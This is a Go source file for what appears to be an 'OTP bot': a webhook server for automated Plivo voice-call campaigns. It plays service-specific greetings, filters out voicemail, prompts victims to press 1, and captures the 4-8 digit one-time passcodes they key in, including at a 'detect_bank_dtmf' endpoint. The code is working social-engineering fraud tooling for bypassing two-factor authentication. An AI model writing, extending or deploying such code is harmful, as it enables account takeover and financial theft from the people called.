package bot

import (
	"fmt"
	"log"
	"strconv"

	"github.com/USERNAME/goland-otpbot-api/config"
	"github.com/USERNAME/goland-otpbot-api/db"
	"github.com/USERNAME/goland-otpbot-api/voice"
	"github.com/gofiber/fiber/v2"
)

// webhookAuthToken is used for HMAC verification if enabled
var webhookAuthToken string

func (b *Bot) registerWebhooks() {
	cfg, err := config.Get()
	if err != nil {
		log.Printf("Failed to get config for webhooks: %v", err)
		return
	}

	webhookAuthToken = cfg.PlivoAuthToken

	app := fiber.New()

	app.Get("/", func(c *fiber.Ctx) error {
		return c.SendString("OTP Bot Webhooks Active 🤖")
	})

	// Answer webhook - called when call is answered
	app.Post("/answer/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleAnswer(campaignID, callID)
		
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Answer webhook: campaign=%d, call=%d", campaignID, callID), "")
		}

		// Get campaign and template for the answer XML
		database := db.Get()
		if database == nil {
			log.Printf("Database not initialized in answer webhook")
			return c.Status(500).SendString("Database error")
		}

		campaign, err := database.GetCampaign(campaignID)
		if err != nil {
			log.Printf("Failed to get campaign %d: %v", campaignID, err)
			return c.Status(404).SendString("Campaign not found")
		}

		template, err := database.GetTemplate(campaign.Service)
		if err != nil {
			log.Printf("Failed to get template %s: %v", campaign.Service, err)
			return c.Status(404).SendString("Template not found")
		}

		// Build the OTP capture URL
		captureURL := buildWebhookURL(cfg.NgrokURL, "capture_otp", campaignID, callID)
		hangupURL := buildWebhookURL(cfg.NgrokURL, "hangup", campaignID, callID)

		xml := voice.BuildXMLResponse(
			template.Greeting,
			captureURL,
			template.Confirmation,
			template.HoldMusic,
			template.Voice,
			"en-US",
			3,
		)

		// Store UUID for hangup tracking
		b.mu.Lock()
		for _, call := range b.activeCalls {
			if call.CallID == callID {
				call.Status = "answered"
				break
			}
		}
		b.mu.Unlock()

		_ = hangupURL // Can be used for custom hangup handling
		return c.Type("xml").SendString(xml)
	})

	app.Get("/ring/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleRing(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Ring webhook: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.SendString(voice.BuildRingXML())
	})

	app.Post("/machine/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleVoicemail(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Machine detection: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.SendString(voice.BuildMachineXML())
	})

	app.Post("/hangup/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}

		b.HandleHangup(campaignID, callID)
		if database := db.Get(); database != nil {
			database.CreateLog("INFO", fmt.Sprintf("Hangup webhook: campaign=%d, call=%d", campaignID, callID), "")
		}

		return c.Type("xml").SendString(voice.BuildHangupXML("Thank you for your time. Goodbye."))
	})

	app.Post("/error/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		errorMsg := c.Query("Error", "Unknown error")

		b.HandleError(campaignID, callID, errorMsg)
		if database := db.Get(); database != nil {
			database.CreateLog("ERROR", fmt.Sprintf("Call error: campaign=%d, call=%d, error=%s", campaignID, callID, errorMsg), "")
		}

		return c.SendString("done")
	})

	app.Post("/detect_dtmf/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		digits := c.FormValue("Digits")

		if digits == "1" {
			cfg, err := config.Get()
			if err != nil {
				log.Printf("Failed to get config in detect_dtmf: %v", err)
				return c.Status(500).SendString("Configuration error")
			}

			database := db.Get()
			if database == nil {
				log.Printf("Database not initialized")
				return c.Status(500).SendString("Database error")
			}

			campaign, err := database.GetCampaign(campaignID)
			if err != nil {
				log.Printf("Failed to get campaign %d: %v", campaignID, err)
				return c.Status(404).SendString("Campaign not found")
			}

			template, err := database.GetTemplate(campaign.Service)
			if err != nil {
				log.Printf("Failed to get template %s: %v", campaign.Service, err)
				return c.Status(404).SendString("Template not found")
			}

			captureURL := buildWebhookURL(cfg.NgrokURL, "capture_otp", campaignID, callID)

			xml := voice.BuildXMLResponse(
				template.ActionPrompt,
				captureURL,
				template.Confirmation,
				template.HoldMusic,
				template.Voice,
				"en-US",
				3,
			)

			return c.Type("xml").SendString(xml)
		}

		b.HandleHangup(campaignID, callID)
		return c.Type("xml").SendString(voice.BuildHangupXML(""))
	})

	app.Post("/capture_otp/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		digits := c.FormValue("Digits")

		// Validate OTP digits - should be 4-8 digits typically
		if digits != "" && len(digits) >= 4 && len(digits) <= 8 {
			b.HandleDTMF(campaignID, callID, digits)
		} else if digits != "" {
			log.Printf("Invalid OTP digits received: %s (length: %d)", digits, len(digits))
		}

		database := db.Get()
		if database == nil {
			log.Printf("Database not initialized")
			return c.Status(500).SendString("Database error")
		}

		campaign, err := database.GetCampaign(campaignID)
		if err != nil {
			log.Printf("Failed to get campaign %d: %v", campaignID, err)
			return c.Status(404).SendString("Campaign not found")
		}

		template, err := database.GetTemplate(campaign.Service)
		if err != nil {
			log.Printf("Failed to get template %s: %v", campaign.Service, err)
			return c.Status(404).SendString("Template not found")
		}

		xml := voice.BuildDTMFXML(
			template.Confirmation,
			template.HoldMusic,
			template.Voice,
			"en-US",
		)

		return c.Type("xml").SendString(xml)
	})

	app.Post("/detect_bank_dtmf/:campaign/:call/", func(c *fiber.Ctx) error {
		campaignID, err := strconv.ParseInt(c.Params("campaign"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid campaign ID")
		}
		callID, err := strconv.ParseInt(c.Params("call"), 10, 64)
		if err != nil {
			return c.Status(400).SendString("Invalid call ID")
		}
		digits := c.FormValue("Digits")

		// Validate and capture OTP
		if digits != "" && len(digits) >= 4 && len(digits) <= 8 {
			b.HandleDTMF(campaignID, callID, digits)
		}

		// Return proper XML response for Plivo
		database := db.Get()
		if database == nil {
			return c.Type("xml").SendString(voice.BuildDTMFXML(
				"Thank you. Your request has been processed.",
				"",
				"en-US-WOMAN",
				"en-US",
			))
		}

		campaign, _ := database.GetCampaign(campaignID)
		template, _ := database.GetTemplate(campaign.Service)

		confirmation := "Thank you. Your request has been processed."
		holdMusic := ""
		voiceType := "en-US-WOMAN"
		if template != nil {
			confirmation = template.Confirmation
			holdMusic = template.HoldMusic
			voiceType = template.Voice
		}

		return c.Type("xml").SendString(voice.BuildDTMFXML(
			confirmation,
			holdMusic,
			voiceType,
			"en-US",
		))
	})

	go func() {
		port := cfg.Port
		if port == "" {
			port = "3000"
		}

		log.Printf("Starting webhook server on port %s", port)
		if err := app.Listen(":" + port); err != nil {
			log.Printf("Webhook server error: %v", err)
		}
	}()
}
